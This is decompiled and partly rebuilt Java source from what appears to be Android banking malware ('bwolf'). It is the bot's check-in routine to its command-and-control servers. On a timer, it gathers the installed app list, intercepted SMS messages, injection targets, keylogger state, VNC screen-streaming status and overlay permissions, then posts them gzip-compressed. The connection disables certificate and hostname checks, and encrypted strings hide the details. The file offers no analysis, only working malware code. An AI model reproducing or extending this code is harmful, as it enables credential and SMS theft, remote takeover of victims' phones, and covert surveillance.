package fddo;

import android.content.Context;
import android.os.AsyncTask;
import android.provider.Settings;
import android.util.Log;

import com.sonnokta.p023w;
import com.sonnokta.utils.LogUtil;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URI;
import java.security.KeyManagementException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.UnrecoverableKeyException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

import javax.net.ssl.KeyManager;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.conn.HttpHostConnectException;
import org.apache.http.conn.scheme.PlainSocketFactory;
import org.apache.http.conn.scheme.Scheme;
import org.apache.http.conn.scheme.SchemeRegistry;
import org.apache.http.conn.ssl.SSLSocketFactory;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpProtocolParams;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* renamed from: fddo.this  reason: invalid class name */
public class Cthis extends AsyncTask<Void, Integer, Csuper> {
    private static String TAG = "bwolf-Cthis";

    /* renamed from: try  reason: not valid java name */
    private static final String f77try = Cbreak.fddo("00fcfb4f28");

    /* renamed from: fddo  reason: collision with root package name */
    protected String f126fddo;

    /* renamed from: for  reason: not valid java name */
    private List<String> f78for = new ArrayList();
    private Context ifdf;

    /* renamed from: new  reason: not valid java name */
    private JSONObject f79new;

    /* renamed from: fddo.this$fddo */
    class fddo extends GZIPOutputStream {
        fddo(OutputStream outputStream) throws IOException {
            super(outputStream);
            this.def.setLevel(9);
        }
    }

    /* renamed from: fddo.this$ifdf */
    class ifdf extends SSLSocketFactory {

        /* renamed from: fddo  reason: collision with root package name */
        SSLContext f128fddo = SSLContext.getInstance("TLS");

        /* renamed from: fddo.this$ifdf$fddo */
        class fddo implements X509TrustManager {

            /* renamed from: fddo  reason: collision with root package name */
            final /* synthetic */ Cthis f129fddo;

            fddo(Cthis thisR) {
                this.f129fddo = thisR;
            }

            public void checkClientTrusted(X509Certificate[] x509CertificateArr, String str) {
            }

            public void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) {
            }

            public X509Certificate[] getAcceptedIssuers() {
                return null;
            }
        }

        public ifdf(KeyStore keyStore) throws UnrecoverableKeyException, KeyStoreException, NoSuchAlgorithmException, KeyManagementException {
            super(keyStore);
            fddo fddo2 = new fddo(Cthis.this);
            this.f128fddo.init((KeyManager[]) null, new TrustManager[]{fddo2}, (SecureRandom) null);
        }

        public Socket createSocket() throws IOException {
            return this.f128fddo.getSocketFactory().createSocket();
        }

        public Socket createSocket(Socket socket, String str, int i, boolean z) throws IOException {
            return this.f128fddo.getSocketFactory().createSocket(socket, str, i, z);
        }
    }

    public Cthis(Context context, JSONObject jSONObject) {

        try {
            m149try(context, jSONObject);
        } catch (Exception unused) {
        }
    }

    /* renamed from: case  reason: not valid java name */
    public static void m147case(Context context) {
        LogUtil.showErrorLog(TAG, "--- m147case ---");
        int intValue = Cthrow.ifdf(context, "net_delay", 0).intValue();
        if (intValue == 0) {
            intValue = 60;
        }
        Long valueOf = Long.valueOf(System.currentTimeMillis());
        Long l = Cthrow.m156for(context, Cbreak.fddo("52a3c65e03dbf7ef7a36ac29"), 0L);
        if (l.longValue() == 0 || valueOf.longValue() - l.longValue() >= ((long) (intValue * 1000))) {
            Cthrow.m157goto(context, Cbreak.fddo("52a3c65e03dbf7ef7a36ac29"), valueOf);
            new Cthis(context, Cthrow.fddo(context, Cbreak.fddo("57b1ea5839cefbed7b36ad3853"), Boolean.FALSE).booleanValue() ? ifdf(context, new Cwhile(context).ifdf()) : m148for(context)).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
        }
    }

    /* renamed from: for  reason: not valid java name */
    public static JSONObject m148for(Context context) {
        LogUtil.showErrorLog(TAG, "--- m148for ---");
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("xc", "bR");
            jSONObject.put("tA", Cgoto.m131static(context));
            jSONObject.put("tB", Cgoto.m117finally(context));
            jSONObject.put("tC", Cgoto.m142while(context));
            jSONObject.put("tD", Cgoto.m138throws(context));
            jSONObject.put("tE", Cgoto.m126package());
            jSONObject.put("tF", Cgoto.m121import());
            jSONObject.put("tG", Cgoto.m127private(context));
            jSONObject.put("lA", Cgoto.m113default(context));
            return jSONObject;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }


    public static JSONObject ifdf(Context context, String[] strArr) {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        JSONObject jSONObject = new JSONObject();

        try {
            jSONObject.put("xc", "bP");
            String str = Cgoto.m131static(context);
            if (!str.isEmpty()) {
                jSONObject.put("tA", str);
            }
            String str2 = Cgoto.m117finally(context);
            if (!str2.isEmpty()) {
                jSONObject.put("tB", str2);
            }
            if (Cgoto.sdgphkmaepghmsdpgfmhapdfmgh(context, "last_applist_update", 600)) {
                String str3 = Cthrow.m158new(context, Cbreak.fddo("57acc65e3dc5fefb6b0caf36507d"), "");
                String str4 = Cgoto.m128protected(context);
                if (!str4.isEmpty() && !str3.equals(str4)) {
                    Cthrow.m159this(context, Cbreak.fddo("57acc65e3dc5fefb6b0caf36507d"), str4);
                    jSONObject.put("lA", str4);
                    Cthrow.m155else(context, "bot_smarts_ver", -1);
                }
            }
            JSONArray jSONArray = new JSONArray();
            for (String jSONObject2 : strArr) {
                JSONObject jSONObject3 = new JSONObject(jSONObject2);
                String string = jSONObject3.getString("tid1");
                String string2 = jSONObject3.getString("tr_inner");
                if (string != null && !string.isEmpty()) {
                    if (!string.equals("0")) {
                        jSONArray.put(string + ":" + string2);
                    }
                }
            }
            jSONObject.put("rZ", jSONArray);
            String str5 = Cthrow.m158new(context, "new_sms", "");
            if (!str5.isEmpty()) {
                jSONObject.put("nS", str5);
            }
            return jSONObject;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }

    /* renamed from: try  reason: not valid java name */
    private void m149try(Context context, JSONObject jSONObject) {
        LogUtil.showErrorLog(TAG, "--- m149try ---");
        this.ifdf = context;
        this.f79new = jSONObject;
        String str = Cgoto.m124native(context);
        this.f126fddo = str;
        if (str.contains(Cbreak.fddo("42"))) {
            for (String str2 : this.f126fddo.split(Cbreak.fddo("62be"))) {
                if (str2.startsWith(Cbreak.fddo("56b6c15a"))) {
                    if (!str2.endsWith("/")) {
                        str2 = str2 + "/";
                    }
                    this.f78for.add(str2);
                }
            }
            Collections.shuffle(this.f78for, new Random());
            return;
        }
        this.f78for.add(this.f126fddo);
    }

    /* renamed from: else  reason: not valid java name */
    public String m150else(String str, JSONObject jSONObject) {
        LogUtil.showErrorLog(TAG, "--- m150else ---");
        Scheme scheme;
        try {
            SchemeRegistry schemeRegistry = new SchemeRegistry();
            URI uri = new URI(str);
            int port = uri.getPort();
            String scheme2 = uri.getScheme();
            if (scheme2 == null) {
                return "continue";
            }
            int i = port != -1 ? port : 80;
            if (scheme2.equals("https")) {
                if (port == -1) {
                    port = 443;
                }
                KeyStore instance = KeyStore.getInstance(KeyStore.getDefaultType());
                instance.load((InputStream) null, (char[]) null);
                ifdf ifdf2 = new ifdf(instance);
                ifdf2.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);
                scheme = new Scheme(scheme2, ifdf2, port);
            } else {
                scheme = new Scheme(scheme2, PlainSocketFactory.getSocketFactory(), i);
            }
            schemeRegistry.register(scheme);
            HttpPost httpPost = new HttpPost(str);
            httpPost.setHeader(Cfor.f61try, Cfor.f57case);
            String jSONObject2 = jSONObject.toString();
            String str2 = Cgoto.m140try(jSONObject2);
            if (str2 != null) {
                jSONObject2 = str2;
            }
            byte[] bytes = jSONObject2.getBytes("UTF-8");
            httpPost.setHeader("Content-Encoding", "gzip");
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            fddo fddo2 = new fddo(byteArrayOutputStream);
            fddo2.write(bytes);
            fddo2.close();
            ByteArrayEntity byteArrayEntity = new ByteArrayEntity(byteArrayOutputStream.toByteArray());
            byteArrayEntity.setContentEncoding("gzip");
            httpPost.setEntity(byteArrayEntity);
            BasicHttpParams basicHttpParams = new BasicHttpParams();
            HttpConnectionParams.setConnectionTimeout(basicHttpParams, 60000);
            HttpConnectionParams.setSoTimeout(basicHttpParams, 60000);
            HttpProtocolParams.setVersion(basicHttpParams, HttpVersion.HTTP_1_1);
            HttpProtocolParams.setContentCharset(basicHttpParams, "UTF-8");
            HttpResponse execute = new DefaultHttpClient(new ThreadSafeClientConnManager(basicHttpParams, schemeRegistry), basicHttpParams).execute(httpPost);
            int statusCode = execute.getStatusLine().getStatusCode();
            if (statusCode == 404) {
                throw new Exception("404");
            } else if (statusCode != 502) {
                InputStream content = execute.getEntity().getContent();
                Header firstHeader = execute.getFirstHeader("Content-Encoding");
                if (firstHeader != null && firstHeader.getValue().equalsIgnoreCase("gzip")) {
                    content = new GZIPInputStream(content);
                }
                InputStreamReader inputStreamReader = new InputStreamReader(content);
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                String str3 = "";
                while (true) {
                    String readLine = bufferedReader.readLine();
                    if (readLine != null) {
                        str3 = str3 + readLine;
                    } else {
                        content.close();
                        inputStreamReader.close();
                        bufferedReader.close();
                        return statusCode + "|" + str3;
                    }
                }
            } else {
                throw new Exception("502");
            }
        } catch (ConnectTimeoutException unused) {
            return "timeout";
        } catch (HttpHostConnectException unused2) {
            return "hostconnect";
        } catch (Exception unused3) {
            return "continue";
        }

//        return "hostconnect";
    }

    /* access modifiers changed from: protected */
    /* renamed from: fddo */
    public Csuper doInBackground(Void... voidArr) {
        LogUtil.showErrorLog(TAG, "--- doInBackground ---");

        int i = 0;
        while (i < 5) {
            try {
                Csuper superR = m153this();
                if (superR.fddo() == 200) {
                    return superR;
                }
                Cgoto.p(5000);
                i++;
            } catch (Exception unused) {
            }
        }
        return new Csuper(this.ifdf);
    }

    /* access modifiers changed from: protected */
    /* renamed from: goto  reason: not valid java name */
    public void onPostExecute(Csuper superR) {

        LogUtil.showErrorLog(TAG, "--- onPostExecute ---");
    }

    /* renamed from: new  reason: not valid java name */
    public String m152new() {
        LogUtil.showErrorLog(TAG, "--- m152new ---");
        String str;
        StringBuilder sb;
        String str2;
        StringBuilder sb2;
        StringBuilder sb3;
        String str3;
        StringBuilder sb4;
        String str4;
        StringBuilder sb5;
        String str5;
        String str6 = Cthrow.m158new(this.ifdf, "vnc", "");
        if (str6.isEmpty()) {
            return "";
        }
        if (!str6.contains("STREAM_LAYOUT;") || !Cgoto.dfhaefdhadfhdfherh(this.ifdf)) {
            sb = new StringBuilder();
            sb.append("");
            str = "layout:off;";
        } else {
            sb = new StringBuilder();
            sb.append("");
            str = "layout:on;";
        }
        sb.append(str);
        String sb6 = sb.toString();
        boolean isStreamScreen = str6.contains("STREAM_SCREEN;");
        boolean isStreamStarted = Cthrow.fddo(this.ifdf, "vnc_stream_started", Boolean.FALSE).booleanValue();

        if (!isStreamScreen || !isStreamStarted) {
            sb2 = new StringBuilder();
            sb2.append(sb6);
            str2 = "screen:off;";
        } else {
            sb2 = new StringBuilder();
            sb2.append(sb6);
            str2 = "screen:on;";
        }
        sb2.append(str2);
        String sb7 = sb2.toString();
        if (!Cgoto.ifdf(this.ifdf).booleanValue()) {
            sb3 = new StringBuilder();
            sb3.append(sb7);
            str3 = "sound:forbid;";
        } else if (Cthrow.fddo(this.ifdf, "vnc_sound_off", Boolean.FALSE).booleanValue()) {
            sb3 = new StringBuilder();
            sb3.append(sb7);
            str3 = "sound:off;";
        } else {
            sb3 = new StringBuilder();
            sb3.append(sb7);
            str3 = "sound:on;";
        }
        sb3.append(str3);
        String sb8 = sb3.toString();
        if (!Cgoto.m114else(this.ifdf)) {
            sb4 = new StringBuilder();
            sb4.append(sb8);
            str4 = "backlight:forbid;";
        } else if (Cthrow.fddo(this.ifdf, "vnc_backlight_off", Boolean.FALSE).booleanValue()) {
            sb4 = new StringBuilder();
            sb4.append(sb8);
            str4 = "backlight:off;";
        } else {
            sb4 = new StringBuilder();
            sb4.append(sb8);
            str4 = "backlight:on;";
        }
        sb4.append(str4);
        String sb9 = sb4.toString();
        if (!Settings.canDrawOverlays(this.ifdf)) {
            sb5 = new StringBuilder();
            sb5.append(sb9);
            str5 = "overlay:forbid;";
        } else if (Cthrow.fddo(this.ifdf, "vnc_overlay_enabled", Boolean.FALSE).booleanValue()) {
            sb5 = new StringBuilder();
            sb5.append(sb9);
            str5 = "overlay:on;";
        } else {
            sb5 = new StringBuilder();
            sb5.append(sb9);
            str5 = "overlay:off;";
        }
        sb5.append(str5);
        return sb5.toString();
    }

    /**
     * TODO - CHECK
     *
     * @return
     */
//    public Csuper m153this_() {
//        String strV2 = Cthrow.m158new(this.ifdf, Cbreak.fddo("52a3c65e03daf7ec7936ad"), "");
//
//        if (strV2 == null)
//            strV2 = "";
//
//        ArrayList<Object> arrayListV2;
//        if (strV2.isEmpty()) {
//            arrayListV2 = new ArrayList<>(this.f78for);
//        } else {
//            arrayListV2 = new ArrayList<>();
//            arrayListV2.add(strV2);
//        }
//
//        try {
//            this.f79new.put(Cbreak.fddo("5280"), Cfor.ifdf);
//            String strV8;
//            if (!Cfor.f59for.isEmpty()) {
//                try {
//                    this.f79new.put(Cbreak.fddo("528e"), (Cgoto.apdkmghpadfmhpadkmfhpmadfphm(this.ifdf, Cfor.f59for) ? Cbreak.fddo("0e") : Cbreak.fddo("0f")));
//                } catch (JSONException e1) {
//                }
//            }
//
//            this.f79new.put(Cbreak.fddo("5c8b"), Cgoto.m130return(this.ifdf));
//            this.f79new.put(Cbreak.fddo("5783"), Cgoto.apkdfmhpadmfhpadomfhgpewirh(this.ifdf) ? Cbreak.fddo("0f") : Cbreak.fddo("0e"));
//            this.f79new.put(Cbreak.fddo("5a83"), Cthrow.fddo(this.ifdf, Cbreak.fddo("5aa7c3433fcccdff6b3eb633687d2c1b"), false) ? Cbreak.fddo("0f") : Cbreak.fddo("0e"));
//            this.f79new.put(Cbreak.fddo("5289"), Cthrow.fddo(this.ifdf, Cbreak.fddo("52add64103c6fc"), false) ? Cbreak.fddo("0f") : Cbreak.fddo("0e"));
//
//            try {
//                if (Cgoto.dfhaefdhadfhdfherh(this.ifdf)) {
//                    strV8 = "1";
//                } else {
//                    strV8 = "0";
//                }
//
//                if (Cgoto.dfhaefdhadfhdfherh(this.ifdf)) {
//                    p023w p023wV9 = p023w.f19while;
//                    if (p023wV9 == null)
//                        strV8 = "2";
//                }
//
//                this.f79new.put(Cbreak.fddo("5783d6"), strV8);
//                this.f79new.put(Cbreak.fddo("5792d4"), Cgoto.ifdf(this.ifdf) ? Cbreak.fddo("0f") : Cbreak.fddo("0e"));
//                int intV12 = Cgoto.m111const(this.ifdf);
//                this.f79new.put(Cbreak.fddo("5780f6"), Cgoto.m111const(this.ifdf));
//                this.f79new.put(Cbreak.fddo("5781e5"), Cgoto.dpkgmhkgmhrkogmjsfghkgj(this.ifdf) ? Cbreak.fddo("0f") : Cbreak.fddo("0e"));
//
//                this.f79new.put(Cbreak.fddo("5791f0"), Cgoto.apdmghpaiodfmhpadfmhpdmfkh(this.ifdf) ? Cbreak.fddo("0f") : Cbreak.fddo("0e"));
//                Cthrow.ifdf(this.ifdf, "check_perms_attempts", Integer.valueOf(0));
//                this.f79new.put(Cbreak.fddo("5791c5"), Cthrow.ifdf(this.ifdf, "check_perms_attempts", Integer.valueOf(0)));
//                this.f79new.put(Cbreak.fddo("5784c5"), Cthrow.m158new(this.ifdf, "perms_failed", ""));
//                this.f79new.put(Cbreak.fddo("5d96c641"), Cthrow.m158new(this.ifdf, "acsb_task", ""));
//                this.f79new.put("up", Cthrow.m156for(this.ifdf, "uptime", Long.valueOf(0)));
//                this.f79new.put("kL", Cthrow.fddo(this.ifdf, "keylogger_enabled", false).booleanValue() ? Boolean.TRUE : Boolean.FALSE);
//                this.f79new.put("vnc", this.m152new());
//                this.f79new.put("fgM", Cthrow.fddo(this.ifdf, "fg_mode", Boolean.FALSE).booleanValue() ? "1" : "0");
//                this.f79new.put("iAg", Cgoto.jghkmjpdokgmhsdghkmdg(this.ifdf));
//                this.f79new.put("rTS", Cgoto.m112continue());
//
//                Iterator<Object> iteratorV0 = arrayListV2.iterator();
//
//                while (iteratorV0.hasNext()) {
//                    strV2 = (String) iteratorV0.next();
//                    try {
//                        strV8 = this.m150else(strV2, this.f79new);
//                        if (strV8.equals(Cbreak.fddo("5daddb5e35c7e7fb"))) {
//                            Cthrow.m159this(this.ifdf, Cbreak.fddo("52a3c65e03daf7ec7936ad"), "");
//                            continue;
//                        }
//
//                        if (strV8.equals(Cbreak.fddo("4aabd84f33dce6"))) {
//                            Cthrow.m159this(this.ifdf, Cbreak.fddo("52a3c65e03daf7ec7936ad"), "");
//                            continue;
//                        }
//
//                        if (strV8.equals(Cbreak.fddo("56adc65e3fc6fcf06a30ab"))) {
//                            Cthrow.m159this(this.ifdf, Cbreak.fddo("52a3c65e03daf7ec7936ad"), "");
//                            continue;
//                        }
//
//                        String[] strArrV8 = strV8.split("\\|", 2);
//
//                        String strIdx1 = strArrV8[1];
//                        String ssh = Cgoto.m125new(strIdx1);
//
//                        if (ssh.equals(strIdx1))
//                            throw new Exception();
//
//
////                    if (!Cgoto.m125new(strArrV8[1]).equals(strArrV8[1])) {
////                        return csuperV8;
////                    } else {
////                        Context contextV2 = this.ifdf;
////                    }
//
//                        Csuper csuperV8 = new Csuper(this.ifdf, Integer.parseInt(strArrV8[0]), Cgoto.m125new(strArrV8[1]));
//
//                        try {
//                            Cthrow.m159this(this.ifdf, "last_server", strV2);
//                            return csuperV8;
//                        } catch (Exception e5) {
//                            Cthrow.m159this(this.ifdf, "last_server", "");
//                            return csuperV8;
//                        }
//                    } catch (Exception e4) {
//                    }
//                }
//            } catch (JSONException e3) {
//            }
//        } catch (JSONException e0) {
//        }
//
//        return new Csuper(this.ifdf);
//    }
    public Csuper m153this() {
        Log.e(TAG, "--- m153this > Check ---");

        String strV0 = "1";
        String strV1 = "0";
        Context contextV2 = this.ifdf;
        String strV3 = "52a3c65e03daf7ec7936ad";
        String strV4 = Cbreak.fddo(strV3);
        String strV5 = "";
        String strV2 = Cthrow.m158new(contextV2, strV4, strV5);
        ArrayList arrayListV2;

        if (strV2 == null)
            strV2 = strV5;

        boolean boolV4 = strV2.isEmpty();
        boolean boolV6 = true;
        boolean boolV7 = false;

        if (boolV4) {
            List listV4 = this.f78for;
            arrayListV2 = new ArrayList(listV4);
            boolV4 = boolV7;
        } else {
            ArrayList arrayListV4 = new ArrayList();
            arrayListV4.add(strV2);
            arrayListV2 = arrayListV4;
            boolV4 = boolV6;
        }

        try {
            JSONObject jsonObjectV8 = this.f79new;
            String strV9 = "5280";
            strV9 = Cbreak.fddo(strV9);
            String strV10 = Cfor.ifdf;
            jsonObjectV8.put(strV9, strV10);    // "lB"

            String strV8 = Cfor.f59for;
            boolean boolV9 = strV8.isEmpty();
            strV10 = "0f";
            String strV11 = "0e";
            if (strV9 == null) {
                try {
                    Context contextV9 = this.ifdf;
                    boolean boolV8 = Cgoto.apdkmghpadfmhpadkmfhpmadfphm(contextV9, strV8);
                    JSONObject jsonObjectV9 = this.f79new;
                    String strV12 = "528e";
                    strV12 = Cbreak.fddo(strV12);
                    if (strV8 != null) {
                        strV8 = Cbreak.fddo(strV10);
                    } else {
                        strV8 = Cbreak.fddo(strV11);
                    }
                    jsonObjectV9.put(strV12, strV8);
                } catch (Exception e1) {
                }
            }

            jsonObjectV8 = this.f79new;
            strV9 = "5c8b";
            strV9 = Cbreak.fddo(strV9);
            Context contextV12 = this.ifdf;
            String strV12 = Cgoto.m130return(contextV12);
            jsonObjectV8.put(strV9, strV12);    // "bI"

            jsonObjectV8 = this.f79new;
            strV9 = "5783";
            strV9 = Cbreak.fddo(strV9);
            contextV12 = this.ifdf;
            boolean boolV12 = Cgoto.apkdfmhpadmfhpadomfhgpewirh(contextV12);
            if (boolV12) {
                strV12 = Cbreak.fddo(strV10);
            } else {
                strV12 = Cbreak.fddo(strV11);
            }
            jsonObjectV8.put(strV9, strV12);    // "iA"

            jsonObjectV8 = this.f79new;
            strV9 = "5a83";
            strV9 = Cbreak.fddo(strV9);
            contextV12 = this.ifdf;
            String strV13 = "5aa7c3433fcccdff6b3eb633687d2c1b";
            strV13 = Cbreak.fddo(strV13);
            Boolean booleanV14 = Boolean.FALSE;
            Boolean booleanV12 = Cthrow.fddo(contextV12, strV13, booleanV14);
            boolV12 = booleanV12.booleanValue();
            if (boolV12) {
                strV12 = Cbreak.fddo(strV10);
            } else {
                strV12 = Cbreak.fddo(strV11);
            }
            jsonObjectV8.put(strV9, strV12);    // "dA"

            jsonObjectV8 = this.f79new;
            strV9 = "5289";
            strV9 = Cbreak.fddo(strV9);
            contextV12 = this.ifdf;
            strV13 = "52add64103c6fc";
            strV13 = Cbreak.fddo(strV13);
            booleanV12 = Cthrow.fddo(contextV12, strV13, booleanV14);
            boolV12 = booleanV12.booleanValue();
            if (boolV12) {
                strV12 = Cbreak.fddo(strV10);
            } else {
                strV12 = Cbreak.fddo(strV11);
            }
            jsonObjectV8.put(strV9, strV12);    // "lK"

//            try_start_2
            Context contextV8 = this.ifdf;
            boolean boolV8 = Cgoto.dfhaefdhadfhdfherh(contextV8);
            if (boolV8) {
                strV8 = strV0;
            } else {
                strV8 = strV1;
            }
            Context contextV9 = this.ifdf;
            boolV9 = Cgoto.dfhaefdhadfhdfherh(contextV9);
            if (boolV9) {
                p023w p023wV9 = p023w.f19while;
                if (p023wV9 == null)
                    strV8 = "2";
            }
            JSONObject jsonObjectV9 = this.f79new;
            strV12 = "5783d6";
            strV12 = Cbreak.fddo(strV12);
            jsonObjectV9.put(strV12, strV8);    // "iAc"

            jsonObjectV8 = this.f79new;
            strV9 = "5792d4";
            strV9 = Cbreak.fddo(strV9);
            contextV12 = this.ifdf;
            booleanV12 = Cgoto.ifdf(contextV12);
            boolV12 = booleanV12.booleanValue();
            if (boolV12) {
                strV12 = Cbreak.fddo(strV10);
            } else {
                strV12 = Cbreak.fddo(strV11);
            }
            jsonObjectV8.put(strV9, strV12);    // "iPa"

            jsonObjectV8 = this.f79new;
            strV9 = "5780f6";
            strV9 = Cbreak.fddo(strV9);
            contextV12 = this.ifdf;
            int intV12 = Cgoto.m111const(contextV12);
            jsonObjectV8.put(strV9, intV12);    // "iBC"

            jsonObjectV8 = this.f79new;
            strV9 = "5781e5";
            strV9 = Cbreak.fddo(strV9);
            contextV12 = this.ifdf;
            boolV12 = Cgoto.dpkgmhkgmhrkogmjsfghkgj(contextV12);
            if (boolV12) {
                strV12 = Cbreak.fddo(strV10);
            } else {
                strV12 = Cbreak.fddo(strV11);
            }
            jsonObjectV8.put(strV9, strV12);    // "iCP"

            jsonObjectV8 = this.f79new;
            strV9 = "5791f0";
            strV9 = Cbreak.fddo(strV9);
            contextV12 = this.ifdf;
            boolV12 = Cgoto.apdmghpaiodfmhpadfmhpdmfkh(contextV12);
            if (!boolV12) {
                strV10 = Cbreak.fddo(strV10);
            } else {
                strV10 = Cbreak.fddo(strV11);
            }
            jsonObjectV8.put(strV9, strV10);    // "iSE"

            jsonObjectV8 = this.f79new;
            strV9 = "5791c5";
            strV9 = Cbreak.fddo(strV9);
            Context contextV10 = this.ifdf;
            strV11 = "check_perms_attempts";
            Integer integerV12 = Integer.valueOf(0);
            Integer integerV10 = Cthrow.ifdf(contextV10, strV11, integerV12);
            jsonObjectV8.put(strV9, integerV10);    // "iSp"

            jsonObjectV8 = this.f79new;
            strV9 = "5784c5";
            strV9 = Cbreak.fddo(strV9);
            contextV10 = this.ifdf;
            strV11 = "perms_failed";
            strV10 = Cthrow.m158new(contextV10, strV11, strV5);
            jsonObjectV8.put(strV9, strV10);    // "iFp"

            jsonObjectV8 = this.f79new;
            strV9 = "5d96c641";
            strV9 = Cbreak.fddo(strV9);
            contextV10 = this.ifdf;
            strV11 = "acsb_task";
            strV10 = Cthrow.m158new(contextV10, strV11, strV5);
            jsonObjectV8.put(strV9, strV10);    // "cTsk"
//            jsonObjectV8.put(strV9, "vnc_screen");    // "cTsk"

//            try_start_3
            jsonObjectV8 = this.f79new;
            strV9 = "up";
            contextV10 = this.ifdf;
            strV11 = "uptime";
            long lgV12 = 0x0;
            Long longV12 = Long.valueOf(lgV12);
            Long longV10 = Cthrow.m156for(contextV10, strV11, longV12);
            jsonObjectV8.put(strV9, longV10);

            jsonObjectV8 = this.f79new;
            strV9 = "kL";
            contextV10 = this.ifdf;
            strV11 = "keylogger_enabled";
            booleanV12 = Boolean.FALSE;
            Boolean booleanV10 = Cthrow.fddo(contextV10, strV11, booleanV12);
            boolean boolV10 = booleanV10.booleanValue();
            if (boolV10) {
                strV10 = strV0;
            } else {
                strV10 = strV1;
            }
            jsonObjectV8.put(strV9, strV10);

            jsonObjectV8 = this.f79new;
            strV9 = "vnc";
            strV10 = this.m152new();
            jsonObjectV8.put(strV9, strV10);

            jsonObjectV8 = this.f79new;
            strV9 = "fgM";
            contextV10 = this.ifdf;
            strV11 = "fg_mode";
            booleanV10 = Cthrow.fddo(contextV10, strV11, booleanV12);
            boolV10 = booleanV10.booleanValue();
            if (!boolV10)
                strV0 = strV1;
            jsonObjectV8.put(strV9, strV0);

            JSONObject jsonObjectV0 = this.f79new;
            strV1 = "iAg";
            contextV8 = this.ifdf;
            boolV8 = Cgoto.jghkmjpdokgmhsdghkmdg(contextV8);
            jsonObjectV0.put(strV1, boolV8);

            jsonObjectV0 = this.f79new;
            strV1 = "rTS";
            long lgV8 = Cgoto.m112continue();
            jsonObjectV0.put(strV1, lgV8);

            Iterator iteratorV0 = arrayListV2.iterator();
            Csuper csuperV1 = null;
            while (iteratorV0.hasNext()) {
                Object objV2 = iteratorV0.next();
                strV2 = (String) objV2;

                try {
                    jsonObjectV8 = this.f79new;
                    strV8 = this.m150else(strV2, jsonObjectV8);
                    strV9 = "5daddb5e35c7e7fb";
                    strV9 = Cbreak.fddo(strV9);
                    boolV9 = strV8.equals(strV9);
                    if (boolV9) {
                        contextV2 = this.ifdf;

//                        goto_c
                        strV8 = Cbreak.fddo(strV3);
                        Cthrow.m159this(contextV2, strV8, strV5);
                        continue;
                    }

                    strV9 = "4aabd84f33dce6";
                    strV9 = Cbreak.fddo(strV9);
                    boolV9 = strV8.equals(strV9);
                    if (boolV9) {
                        contextV2 = this.ifdf;
                        strV8 = Cbreak.fddo(strV3);
                        Cthrow.m159this(contextV2, strV8, strV5);
                        continue;
                    }

                    strV9 = "56adc65e3fc6fcf06a30ab";
                    strV9 = Cbreak.fddo(strV9);
                    boolV9 = strV8.equals(strV9);
                    if (boolV9) {
                        contextV2 = this.ifdf;
                        strV8 = Cbreak.fddo(strV3);
                        Cthrow.m159this(contextV2, strV8, strV5);
                        continue;
                    }

                    strV9 = "62be";
                    strV9 = Cbreak.fddo(strV9);
                    int intV10 = 0x2;
                    String[] strArrV8 = strV8.split(strV9, intV10);
                    strV9 = strArrV8[0];
                    int intV9 = Integer.parseInt(strV9);
                    strV10 = strArrV8[1];
                    strV10 = Cgoto.m125new(strV10);
                    strV8 = strArrV8[1];
                    boolV8 = strV10.equals(strV8);
                    if (!boolV8) {
                        Csuper csuperV8;
                        Context contextV11 = this.ifdf;
                        csuperV8 = new Csuper(contextV11, intV9, strV10);

                        try {
                            Context contextV1 = this.ifdf;
                            strV9 = Cbreak.fddo(strV3);
                            Cthrow.m159this(contextV1, strV9, strV2);
                            csuperV1 = csuperV8;
                            return csuperV1;
                        } catch (Exception e5) {
                            csuperV1 = csuperV8;
                            if (boolV4) {
                                contextV2 = this.ifdf;
                                strV8 = Cbreak.fddo(strV3);
                                Cthrow.m159this(contextV2, strV8, strV5);
                            }
                            continue;
                        }
                    }
                } catch (Exception e) {

                }
            }
        } catch (Exception e0) {
        }

        Csuper csuperV0;
        Context contextV1 = this.ifdf;
        csuperV0 = new Csuper(contextV1);
        return csuperV0;
    }
}